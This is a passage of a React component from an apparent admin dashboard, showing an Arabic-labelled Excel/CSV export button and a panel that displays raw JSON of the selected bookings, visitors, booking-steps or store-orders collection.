                  className="bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold px-3 py-1.5 rounded-lg transition flex items-center gap-1.5 cursor-pointer"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>تصدير Excel / CSV</span>
                </button>
              </div>
            </div>

            <pre className="bg-slate-950 p-4 rounded-xl text-emerald-400 font-mono text-xs overflow-x-auto max-h-[600px] border border-slate-800">
              {JSON.stringify(
                rawCollection === 'bookings' ? esfgdrBookings :
                rawCollection === 'visitors' ? esfgdrVisitors :
                rawCollection === 'bookings_steps' ? esfgdrSteps : storeOrders,
                null,
                2
              )}
            </pre>
          </div>
        </div>
      )}

    </div>
  );
};
